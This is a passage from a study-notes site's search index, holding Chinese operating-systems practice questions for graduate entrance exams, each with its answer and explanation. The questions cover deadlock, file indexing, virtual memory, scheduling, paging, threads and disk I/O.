\u53f0\u8bbe\u5907\u540e\u7cfb\u7edf\u4e2d\u65e0\u53ef\u7528\u7684\u540c\u7c7b\u8bbe\u5907\u5c31\u4f1a\u5f15\u8d77\u6b7b\u9501\uff0c\u5982\u679c\u6b64\u65f6\u80fd\u591a\u51fa\u4e00\u53f0\u540c\u7c7b\u8bbe\u5907\u5c31\u4e0d\u4f1a\u53d1\u751f\u6b7b\u9501\uff0c\u6545\u6700\u5c11\u9700\u89812+3+4+1=10 \u53f0\u540c\u7c7b\u8bbe\u5907\u5c31\u80fd\u4fdd\u8bc1\u7cfb\u7edf\u4e0d\u4f1a\u53d1\u751f\u6b7b\u9501\u3002 2.7. Sun # \u6d89\u53ca\u67d0\u4e00\u8d44\u6e90\u9020\u6210\u4e0e\u65f6\u95f4\u6709\u5173\u7684\u9519\u8bef\u7684\u539f\u56e0\uff0c\u6b63\u786e\u7684\u662f \u3002\uff3b\u5357\u4eac\u7406\u5de5\u5927\u5b66\uff3d A\uff0e\u4e00\u4e2a\u8fdb\u7a0b\u591a\u6b21\u7533\u8bf7\uff0c\u91ca\u653e\u8be5\u8d44\u6e90 B\uff0e\u82e5\u5e72\u5e76\u53d1\u8fdb\u7a0b\u540c\u65f6\u4f7f\u7528\u8be5\u8d44\u6e90 C\uff0e\u82e5\u5e72\u5e76\u53d1\u8fdb\u7a0b\u4e92\u65a5\u4f7f\u7528\u8be5\u8d44\u6e90 D\uff0e\u4ee5\u4e0a\u8bf4\u6cd5\u5747\u4e0d\u5bf9 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u4e00\u4e2a\u8fdb\u7a0b\u4e0d\u53ef\u80fd\u5f15\u8d77\u6b7b\u9501\uff0c\u82e5\u5e72\u5e76\u53d1\u8fdb\u7a0b\u4e92\u65a5\u7684\u4f7f\u7528\u8d44\u6e90\uff0c\u7cfb\u7edf\u4f1a\u91c7\u7528P\uff0cV\u64cd\u4f5c\u5bf9\u8d44\u6e90\u8fdb\u884c\u7ba1\u7406\uff0c\u56e0\u6b64\u4e5f\u4e0d\u4f1a\u5f15\u8d77\u6b7b\u9501\uff0c\u5bf9B\u9009\u9879\uff0c\u82e5\u4e0d\u52a0\u9650\u5236\uff0c\u82e5\u5e72\u5e76\u53d1\u8fdb\u7a0b\u540c\u65f6\u4f7f\u7528\u8be5\u8d44\u6e90\uff0c\u800c\u8d44\u6e90\u6709\u9650\u65f6\uff0c\u6709\u53ef\u80fd\u4f1a\u9020\u6210\u6b7b\u9501\u3002","title":"2020 July"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#2020-july","text":"","title":"\u64cd\u4f5c\u7cfb\u7edf\u6bcf\u65e5\u4e00\u9898 2020 July"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#_1","text":"\u64cd\u4f5c\u7cfb\u7edf\u6bcf\u65e5\u4e00\u9898 2020 July \u76ee\u5f55 1. Week 3 1.1. Wed 1.2. Thu 1.3. Fri 1.4. Sat 1.5. Sun 2. Week 4 2.1. Mon 2.2. Tue 2.3. Wed 2.4. Thu 2.5. Fri 2.6. Sat 2.7. Sun","title":"\u76ee\u5f55"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#1-week-3","text":"","title":"1. Week 3"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#11-wed","text":"\u8bbe\u6587\u4ef6\u7d22\u5f15\u8282\u70b9\u4e2d\u67097 \u4e2a\u5730\u5740\u9879,\u5176\u4e2d4 \u4e2a\u5730\u5740\u9879\u662f\u76f4\u63a5\u5730\u5740\u7d22\u5f15,2 \u4e2a\u5730\u5740\u9879\u662f\u4e00\u7ea7\u95f4\u63a5\u5730\u5740\u7d22\u5f15,1 \u4e2a\u5730\u5740\u9879\u662f\u4e8c\u7ea7\u95f4\u63a5\u5730\u5740\u7d22\u5f15,\u6bcf\u4e2a\u5730\u5740\u9879\u5927\u5c0f\u4e3a4 \u5b57\u8282\u3002\u82e5\u78c1\u76d8\u7d22\u5f15\u5757\u548c\u78c1\u76d8\u6570\u636e\u5757\u5927\u5c0f\u5747\u4e3a256 \u5b57\u8282,\u5219\u53ef\u8868\u793a\u7684\u5355\u4e2a\u6587\u4ef6\u6700\u5927\u957f\u5ea6\u662f \u3002\uff3b\u5409\u6797\u5927\u5b66\uff3d A.33 KB B.519 KB C.1057 KB D.16513 KB \u7b54\u6848 \u7b54\u6848\uff1aC \u6bcf\u4e2a\u76f4\u63a5\u5730\u5740\u7d22\u5f15\u53ef\u4ee5\u5b58\u50a8 256B \u6570\u636e\uff0c4\u4e2a\u53ef\u4ee5\u5b58\u50a8 1KB \u6570\u636e\u3002 \u4e00\u7ea7\u95f4\u63a5\u5730\u5740\u7d22\u5f15\u53ef\u4ee5\u5b58\u50a8 256 / 4 = 64 \u4e2a\u5730\u5740\u9879\uff0c\u5bf9\u5e94 64 x 256 = 16 KB\uff0c2\u4e2a\u4e3a 32KB\u3002 \u4e8c\u7ea7\u5730\u5740\u7d22\u5f15\u53ef\u4ee5\u5b58\u50a8 64 * 64 = 4K \u4e2a\u5730\u5740\u9879\uff0c\u5bf9\u5e94 4K x 256 = 1024 KB \u6570\u636e\u3002 \u7d2f\u52a0\u4e3a 1057 KB\u3002","title":"1.1. Wed"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#12-thu","text":"\u4e0b\u5217\u5173\u4e8e\u865a\u62df\u5b58\u50a8\u5668\u7684\u53d9\u8ff0\u4e2d\uff0c\u6b63\u786e\u7684\u662f \u3002\uff3b\u4e2d\u5c71\u5927\u5b66\uff3d A\uff0e\u865a\u62df\u5b58\u50a8\u53ea\u80fd\u57fa\u4e8e\u8fde\u7eed\u5206\u914d\u6280\u672f B\uff0e\u865a\u62df\u5b58\u50a8\u53ea\u80fd\u57fa\u4e8e\u975e\u8fde\u7eed\u5206\u914d\u6280\u672f C\uff0e\u865a\u62df\u5b58\u50a8\u5bb9\u91cf\u53ea\u53d7\u5916\u5b58\u5bb9\u91cf\u7684\u9650\u5236 D\uff0e\u865a\u62df\u5b58\u50a8\u5bb9\u91cf\u53ea\u53d7\u5185\u5b58\u5bb9\u91cf\u7684\u9650\u5236 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u865a\u62df\u5185\u5b58\u7684\u5b9e\u73b0\u9700\u8981\u5efa\u7acb\u5728\u79bb\u6563\u5206\u914d\u7684\u5185\u5b58\u7ba1\u7406\u65b9\u5f0f\u7684\u57fa\u7840\u4e0a\uff0c\u6709\u4ee5\u4e0b\u4e09\u79cd\u5b9e\u73b0\u65b9\u5f0f\uff1a\u2460\u8bf7\u6c42\u5206\u9875\u5b58\u50a8\u7ba1\u7406\uff1b\u2461\u8bf7\u6c42\u5206\u6bb5\u5b58\u50a8\u7ba1\u7406\uff1b\u2462\u8bf7\u6c42\u6bb5\u9875\u5f0f\u5b58\u50a8\u7ba1\u7406\u3002\u865a\u62df\u5b58\u50a8\u5668\u5bb9\u91cf\u65e2\u4e0d\u53d7\u5916\u5b58\u5bb9\u91cf\u9650\u5236\uff0c\u4e5f\u4e0d\u53d7\u5185\u5b58\u5bb9\u91cf\u9650\u5236\uff0c\u800c\u662f\u7531CPU \u7684\u5bfb\u5740\u8303\u56f4\u51b3\u5b9a\u7684\u3002\u865a\u62df\u5b58\u50a8\u5668\u7684\u5b9e\u73b0\u53d7\u5916\u5b58\u5bb9\u91cf\u3001\u5185\u5b58\u5bb9\u91cf\u7684\u9650\u5236\u3002","title":"1.2. Thu"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#13-fri","text":"\u82e5\u67d0\u5355\u5904\u7406\u5668\u591a\u8fdb\u7a0b\u7cfb\u7edf\u4e2d\u6709\u591a\u4e2a\u5c31\u7eea\u6001\u8fdb\u7a0b\uff0c\u5219\u4e0b\u5217\u5173\u4e8e\u5904\u7406\u673a\u8c03\u5ea6\u7684\u53d9\u8ff0\u4e2d\uff0c\u9519\u8bef\u7684\u662f \u3002\uff3b\u4e2d\u5c71\u5927\u5b66\uff3d A\uff0e\u5728\u8fdb\u7a0b\u7ed3\u675f\u65f6\u80fd\u8fdb\u884c\u5904\u7406\u673a\u8c03\u5ea6 B\uff0e\u521b\u5efa\u65b0\u8fdb\u7a0b\u540e\u80fd\u8fdb\u884c\u5904\u7406\u673a\u8c03\u5ea6 C\uff0e\u5728\u8fdb\u7a0b\u5904\u4e8e\u4e34\u754c\u533a\u65f6\u4e0d\u80fd\u8fdb\u884c\u5904\u7406\u673a\u8c03\u5ea6 D\uff0e\u5728\u7cfb\u7edf\u8c03\u7528\u5b8c\u6210\u5e76\u8fd4\u56de\u7528\u6237\u6001\u65f6\u80fd\u8fdb\u884c\u5904\u7406\u673a\u8c03 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u9009\u9879A\u3001B\u3001D \u663e\u7136\u662f\u53ef\u4ee5\u8fdb\u884c\u5904\u7406\u673a\u8c03\u5ea6\u7684\u60c5\u51b5\u3002\u5bf9\u4e8eC\uff0c\u5f53\u8fdb\u7a0b\u5904\u4e8e\u4e34\u754c\u533a\u65f6\uff0c\u8bf4\u660e\u8fdb\u7a0b\u6b63\u5728\u5360\u7528\u5904\u7406\u673a\uff0c\u53ea\u8981\u4e0d\u7834\u574f\u4e34\u754c\u8d44\u6e90\u7684\u4f7f\u7528\u89c4\u5219\uff0c\u662f\u4e0d\u4f1a\u5f71\u54cd\u5904\u7406\u673a\u8c03\u5ea6\u7684\uff0c\u6bd4\u5982\uff0c\u901a\u5e38\u8bbf\u95ee\u4e34\u754c\u8d44\u6e90\u53ef\u80fd\u662f\u6162\u901f\u7684\u5916\u8bbe\uff08\u5982\u6253\u5370\u673a\uff09\uff0c\u5982\u679c\u5728\u8fdb\u7a0b\u8bbf\u95ee\u6253\u5370\u673a\u65f6\uff0c\u4e0d\u80fd\u5904\u7406\u673a\u8c03\u5ea6\uff0c\u90a3\u4e48\u7cfb\u7edf\u7684\u6027\u80fd\u5c06\u662f\u975e\u5e38\u4f4e\u7684\u3002\u51e0\u79cd\u4e0d\u9002\u5408\u8fdb\u884c\u5904\u7406\u673a\u8c03\u5ea6\u7684\u60c5\u51b5\uff1a\u2460\u5728\u5904\u7406\u4e2d\u65ad\u7684\u8fc7\u7a0b\u4e2d\uff1b\u2461\u8fdb\u7a0b\u5728\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u7a0b\u5e8f\u4e34\u754c\u533a\u4e2d\uff1b\u2462\u5176\u4ed6\u9700\u8981\u5b8c\u5168\u5c4f\u853d\u4e2d\u65ad\u7684\u539f\u5b50\u64cd\u4f5c\u8fc7\u7a0b\u4e2d\u3002","title":"1.3. Fri"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#14-sat","text":"\u8bbe\u7cfb\u7edf\u7f13\u51b2\u533a\u548c\u7528\u6237\u5de5\u4f5c\u533a\u5747\u91c7\u7528\u5355\u7f13\u51b2\uff0c\u4ece\u5916\u8bbe\u8bfb\u51651 \u4e2a\u6570\u636e\u5757\u5230\u7cfb\u7edf\u7f13\u51b2\u533a\u7684\u65f6\u95f4\u4e3a100\uff0c\u4ece\u7cfb\u7edf\u7f13\u51b2\u533a\u8bfb\u51651 \u4e2a\u6570\u636e\u5757\u5230\u7528\u6237\u5de5\u4f5c\u533a\u7684\u65f6\u95f4\u4e3a5\uff0c\u5bf9\u7528\u6237\u5de5\u4f5c\u533a\u4e2d\u76841 \u4e2a\u6570\u636e\u5757\u8fdb\u884c\u5206\u6790\u7684\u65f6\u95f4\u4e3a90\u3002\u8fdb\u7a0b\u4ece\u5916\u8bbe\u8bfb\u5165\u5e76\u5206\u67902 \u4e2a\u6570\u636e\u5757\u7684\u6700\u77ed\u65f6\u95f4\u662f \u3002\uff3b\u6b66\u6c49\u7406\u5de5\u5927\u5b66\uff3d A.200 B.295 C.300 D.390 \u6ce8\uff1a\u6570\u636e\u5411\u5916\u4f20\u8f93\u5b8c\u6bd5\u4ee5\u540e\u624d\u80fd\u63a5\u6536\u65b0\u7684\u6570\u636e\u4f20\u5165 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a 100+5+MAX(90,100)+5+90==100+5+100+5+90=300 \u6ce8\uff1a\u7b2c1 \u6b21\u5206\u6790\u4e0e\u7b2c\u4e8c\u6b21\u8bfb\u5916\u8bbe\u5e76\u884c\u6267\u884c\u3002 \u6570\u636e\u57571 \u4ece\u5916\u8bbe\u5230\u7528\u6237\u5de5\u4f5c\u533a\u7684\u603b\u65f6\u95f4\u4e3a 105\uff0c\u5728\u8fd9\u6bb5\u65f6\u95f4\u4e2d\uff0c\u6570\u636e\u57572 \u6ca1\u6709\u8fdb\u884c\u64cd \u4f5c\u3002\u5728\u6570\u636e\u57571 \u8fdb\u884c\u5206\u6790\u5904\u7406\u65f6\uff0c\u6570\u636e\u57572 \u4ece\u5916\u8bbe\u5230\u7528\u6237\u5de5\u4f5c\u533a\u7684\u603b\u65f6\u95f4\u4e3a105\uff0c\u8fd9\u6bb5\u65f6 \u95f4\u662f\u5e76\u884c\u7684\u3002\u518d\u52a0\u4e0a\u6570\u636e\u57572 \u8fdb\u884c\u5904\u7406\u7684\u65f6\u95f490\uff0c\u603b\u5171\u662f300.","title":"1.4. Sat"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#15-sun","text":"\u67d0\u8ba1\u7b97\u673a\u91c7\u7528\u4e8c\u7ea7\u9875\u8868\u7684\u5206\u9875\u5b58\u50a8\u7ba1\u7406\u65b9\u5f0f\uff0c\u6309\u5b57\u8282\u7f16\u5740\uff0c\u9875\u5927\u5c0f\u4e3a2^10\u5b57\u8282\uff0c\u9875\u8868\u9879\u5927\u5c0f\u4e3a2 \u5b57\u8282\uff0c\u903b\u8f91\u5730\u5740\u7ed3\u6784\u4e3a\uff1a \u903b\u8f91\u5730\u5740\u7a7a\u95f4\u5927\u5c0f\u4e3a2^16\u9875\uff0c\u5219\u8868\u793a\u6574\u4e2a\u903b\u8f91\u5730\u5740\u7a7a\u95f4\u7684\u9875\u76ee\u5f55\u8868\u4e2d\u5305\u542b\u8868\u9879\u7684\u4e2a\u6570\u81f3\u5c11\u662f______\u3002\uff3b\u897f\u5317\u5927\u5b66\uff3d A.64 B.128 C.256 D.512 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a1 \u9875\u4e3a1KB\uff0c\u4e00\u9875\u53ef\u5b58\u50a8512 \u4e2a\u9875\u5730\u5740\uff08\u9875\u8868\u9879\u5927\u5c0f\u4e3a2 \u5b57\u8282\uff09\uff0c\u903b\u8f91\u5730\u5740\u7a7a\u95f4\u5927\u5c0f\u4e3a2^16\u9875\uff0c\u9875\u8868\u5360\u75282^16/512=128 \u9875\uff0c\u6240\u4ee5\u9875\u76ee\u5f55\u4e2d\u81f3\u5c11\u8981\u6709128 \u4e2a\u8868\u9879\u3002","title":"1.5. Sun"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#2-week-4","text":"","title":"2. Week 4"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#21-mon","text":"\u4e0b\u5217\u5173\u4e8e\u8fdb\u7a0b\u548c\u7ebf\u7a0b\u7684\u53d9\u8ff0\u4e2d\uff0c\u6b63\u786e\u7684\u662f \u3002\uff3b\u897f\u5317\u5927\u5b66\uff3d A\uff0e\u4e0d\u7ba1\u7cfb\u7edf\u662f\u5426\u652f\u6301\u7ebf\u7a0b\uff0c\u8fdb\u7a0b\u90fd\u662f\u8d44\u6e90\u5206\u914d\u7684\u57fa\u672c\u5355\u4f4d B\uff0e\u7ebf\u7a0b\u662f\u8d44\u6e90\u5206\u914d\u7684\u57fa\u672c\u5355\u4f4d\uff0c\u8fdb\u7a0b\u662f\u8c03\u5ea6\u7684\u57fa\u672c\u5355\u4f4d C\uff0e\u7cfb\u7edf\u7ea7\u7ebf\u7a0b\u548c\u7528\u6237\u7ea7\u7ebf\u7a0b\u7684\u5207\u6362\u90fd\u9700\u8981\u5185\u6838\u7684\u652f\u6301 D\uff0e\u540c\u4e00\u8fdb\u7a0b\u4e2d\u7684\u5404\u4e2a\u7ebf\u7a0b\u62e5\u6709\u5404\u81ea\u4e0d\u540c\u7684\u5730\u5740\u7a7a\u95f4 \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u5728\u7528\u6237\u7ea7\u7ebf\u7a0b\u4e2d\uff0c\u6709\u5173\u7ebf\u7a0b\u7ba1\u7406\u7684\u6240\u6709\u5de5\u4f5c\u90fd\u7531\u5e94\u7528\u7a0b\u5e8f\u5b8c\u6210\uff0c\u65e0\u9700\u5185\u6838 \u7684\u5e72\u9884\uff0c\u5185\u6838\u610f\u8bc6\u4e0d\u5230\u7ebf\u7a0b\u7684\u5b58\u5728\u3002\u5173\u4e8e\u8fdb\u7a0b\u548c\u7ebf\u7a0b\u7684\u5176\u4ed6\u533a\u522b\u89c1\u4e0b\u8868\u6240\u793a\uff1a \u7c7b\u578b \u8fdb\u7a0b \u7ebf\u7a0b \u8d44\u6e90\u5206\u914d \u8fdb\u7a0b\u662f\u8d44\u6e90\u5206\u914d\u548c\u62e5\u6709\u7684\u57fa\u672c\u5355\u4f4d \u7ebf\u7a0b\u81ea\u5df1\u57fa\u672c\u4e0d\u62e5\u6709\u7cfb\u7edf\u8d44\u6e90\uff0c\u4f46\u5b83\u53ef\u4ee5\u8bbf\u95ee\u6240\u5c5e\u8fdb\u7a0b\u62e5\u6709\u7684\u5168\u90e8\u8d44\u6e90 \u8c03\u5ea6 \u5728\u6ca1\u6709\u5f15\u5165\u7ebf\u7a0b\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u8fdb\u7a0b\u662f\u72ec\u7acb\u8c03\u5ea6\u548c\u5206\u6d3e\u7684\u57fa\u672c\u5355\u4f4d \u5f15\u5165\u7ebf\u7a0b\u540e\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u7ebf\u7a0b\u662f\u72ec\u7acb\u8c03\u5ea6\u548c\u5206\u6d3e\u7684\u57fa\u672c\u5355\u4f4d \u5730\u5740\u7a7a\u95f4 \u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\u4e4b\u95f4\u76f8\u4e92\u72ec\u7acb \u540c\u4e00\u8fdb\u7a0b\u7684\u5404\u7ebf\u7a0b\u95f4\u5171\u4eab\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4","title":"2.1. Mon"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#22-tue","text":"\u5728\u652f\u6301\u591a\u7ebf\u7a0b\u7684\u7cfb\u7edf\u4e2d\uff0c\u8fdb\u7a0bP \u521b\u5efa\u7684\u82e5\u5e72\u4e2a\u7ebf\u7a0b\u4e0d\u80fd\u5171\u4eab\u7684\u662f \uff3b\u897f\u5317\u5927\u5b66] A\uff0e\u8fdb\u7a0bP \u7684\u4ee3\u7801\u6bb5 B\uff0e\u8fdb\u7a0bP \u4e2d\u6253\u5f00\u7684\u6587\u4ef6 C\uff0e\u8fdb\u7a0bP \u7684\u5168\u5c40\u53d8\u91cf D\uff0e\u8fdb\u7a0bP \u4e2d\u67d0\u7ebf\u7a0b\u7684\u6808\u6307\u9488 \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u8fdb\u7a0b\u4e2d\u67d0\u7ebf\u7a0b\u7684\u6808\u6307\u9488\uff0c\u5bf9\u5176\u5b83\u7ebf\u7a0b\u900f\u660e\uff0c\u4e0d\u80fd\u4e0e\u5176\u5b83\u7ebf\u7a0b\u5171\u4eab\u3002","title":"2.2. Tue"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#23-wed","text":"\u4e0b\u5217\u9009\u9879\u4e2d\uff0c\u4e0d\u80fd\u6539\u5584\u78c1\u76d8\u8bbe\u5907I/O \u6027\u80fd\u7684\u662f \u3002\uff3b\u7535\u5b50\u79d1\u6280\u5927\u5b66\uff3d A\uff0e\u91cd\u6392I/O \u8bf7\u6c42\u6b21\u5e8f B\uff0e\u5728\u4e00\u4e2a\u78c1\u76d8\u4e0a\u8bbe\u7f6e\u591a\u4e2a\u5206\u533a C\uff0e\u9884\u8bfb\u548c\u6ede\u540e\u5199 D\uff0e\u4f18\u5316\u6587\u4ef6\u7269\u7406\u5757\u7684\u5206\u5e03 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u5bf9\u4e8eA\uff0c\u91cd\u6392I/O \u8bf7\u6c42\u6b21\u5e8f\u4e5f\u5c31\u662f\u8fdb\u884cI/O \u8c03\u5ea6\uff0c\u4ece\u800c\u4f7f\u8fdb\u7a0b\u4e4b\u95f4\u516c\u5e73\u5730\u5171\u4eab\u78c1\u76d8\u8bbf\u95ee\uff0c\u51cf\u5c11I/O \u5b8c\u6210\u6240\u9700\u8981\u7684\u5e73\u5747\u7b49\u5f85\u65f6\u95f4\u3002\u5bf9\u4e8eC\uff0c\u7f13\u51b2\u533a\u7ed3\u5408\u9884\u8bfb\u548c\u6ede\u540e\u5199\u6280\u672f\u5bf9\u4e8e\u5177\u6709\u91cd\u590d\u6027\u53ca\u9635\u53d1\u6027\u7684I/O \u8fdb\u7a0b\u6539\u5584\u78c1\u76d8I/O \u6027\u80fd\u5f88\u6709\u5e2e\u52a9\u3002\u5bf9\u4e8eD\uff0c\u4f18\u5316\u6587\u4ef6\u7269\u7406\u5757\u7684\u5206\u5e03\u53ef\u4ee5\u51cf\u5c11\u5bfb\u627e\u65f6\u95f4\u4e0e\u5ef6\u8fdf\u65f6\u95f4\uff0c\u4ece\u800c\u63d0\u9ad8\u78c1\u76d8\u6027\u80fd\u3002","title":"2.3. Wed"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#24-thu","text":"\u6587\u4ef6\u7cfb\u7edf\u7528\u4f4d\u56fe\u6cd5\u8868\u793a\u78c1\u76d8\u7a7a\u95f4\u7684\u5206\u914d\u60c5\u51b5\uff0c\u4f4d\u56fe\u5b58\u4e8e\u78c1\u76d8\u768432\uff5e127 \u53f7\u5757\u4e2d\uff0c\u6bcf\u4e2a\u76d8\u5757\u53601024 \u4e2a\u5b57\u8282\uff0c\u76d8\u5757\u548c\u5757\u5185\u5b57\u8282\u5747\u4ece0 \u5f00\u59cb\u7f16\u53f7\u3002\u5047\u8bbe\u8981\u91ca\u653e\u7684\u76d8\u5757\u53f7\u4e3a409612\uff0c\u5219\u4f4d\u56fe\u4e2d\u8981\u4fee\u6539\u7684\u4f4d\u6240\u5728\u7684\u76d8\u5757\u53f7\u548c\u5757\u5185\u5b57\u8282\u5e8f\u53f7\u5206\u522b\u662f \uff3b\u7535\u5b50\u79d1\u6280\u5927\u5b66\uff3d A\uff0e81\uff0c1 B\uff0e81\uff0c2 C\uff0e82\uff0c1 D\uff0e82\uff0c2 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u4e00\u4e2a\u76d8\u5757\u67098192 \u4f4d\uff0c409612/8192=50\uff0c409612%8192= 12\uff0c\u6240\u4ee5\uff0c\u76d8\u5757\u53f7\u4e3a409612 \u5bf9\u5e94\u4f4d\u56fe\u4e2d\u7684\u76d8\u5757\u53f7\u4e3a32+50=82\uff0c\u5757\u5185\u5b57\u8282\u5e8f\u53f7floor(12/8) = 1 (0~7\u4f4d\u5757\u5185\u5b57\u8282\u5e8f\u53f7\u4e3a0, 8~15\u5757\u5185\u5b57\u8282\u5e8f\u53f7\u4e3a1)","title":"2.4. Thu"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#25-fri","text":"\u5047\u8bbe5 \u4e2a\u8fdb\u7a0bP0\u3001P1\u3001P2\u3001P3\u3001P4 \u5171\u4eab\u4e09\u7c7b\u8d44\u6e90R1\u3001R2\u3001R3\uff0c\u8fd9\u4e9b\u8d44\u6e90\u603b\u6570\u5206\u522b\u4e3a18\u30016\u300122\u3002T0 \u65f6\u523b\u7684\u8d44\u6e90\u5206\u914d\u60c5\u51b5\u5982\u4e0b\u8868\u6240\u793a\uff0c\u6b64\u65f6\u5b58\u5728\u7684\u4e00\u4e2a\u5b89\u5168\u5e8f\u5217\u662f \uff3b\u7535\u5b50\u79d1\u6280\u5927\u5b66\uff3d A. P0, P2, P4, P1, P3 B. P1, P0, P3, P4, P2 C. P2, P1, P0, P3, P4 D. P3, P4, P2, P1, P0 \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u521d\u59cb\u65f6\u8fdb\u7a0bP1 \u4e0eP3 \u53ef\u6ee1\u8db3\u9700\u6c42\uff0c\u6392\u9664A\u3001C\u3002\u5c1d\u8bd5\u7ed9P1 \u5206\u914d\u8d44\u6e90\uff0c\u5219P1 \u5b8c\u6210\u540eAvailable \u5c06\u53d8\u4e3a\uff086,3,6\uff09\uff0c\u65e0\u6cd5\u6ee1\u8db3P0 \u7684\u9700\u6c42\uff0c\u6392\u9664B\u3002\u5c1d\u8bd5\u7ed9P3 \u5206\u914d\u8d44\u6e90\uff0c\u5219P3 \u5b8c\u6210\u540eAvailable \u5c06\u53d8\u4e3a\uff084,3,7\uff09\uff0c\u8be5\u5411\u91cf\u80fd\u6ee1\u8db3\u5176\u4ed6\u6240\u6709\u8fdb\u7a0b\u7684\u9700\u6c42\u3002\u6240\u4ee5\uff0c\u4ee5P3 \u5f00\u5934\u7684\u6240\u6709\u5e8f\u5217\u90fd\u662f\u5b89\u5168\u5e8f\u5217\u3002","title":"2.5. Fri"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#26-sat","text":"\u67d0\u7cfb\u7edf\u6709n \u53f0\u4e92\u65a5\u4f7f\u7528\u7684\u540c\u7c7b\u8bbe\u5907\uff0c\u4e09\u4e2a\u5e76\u53d1\u8fdb\u7a0b\u5206\u522b\u9700\u89813\u30014\u30015 \u53f0\u8bbe\u5907\uff0c\u53ef\u786e\u4fdd\u7cfb\u7edf\u4e0d\u53d1\u751f\u6b7b\u9501\u7684\u8bbe\u5907\u6570n \u6700\u5c0f\u4e3a \uff3b\u5409\u6797\u5927\u5b66\uff3d A\uff0e9 B\uff0e10 C\uff0e11 D\uff0e12 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u5982\u679c\u4e09\u4e2a\u5e76\u53d1\u8fdb\u7a0b\u5206\u522b\u83b7\u5f972\u30013\u30014 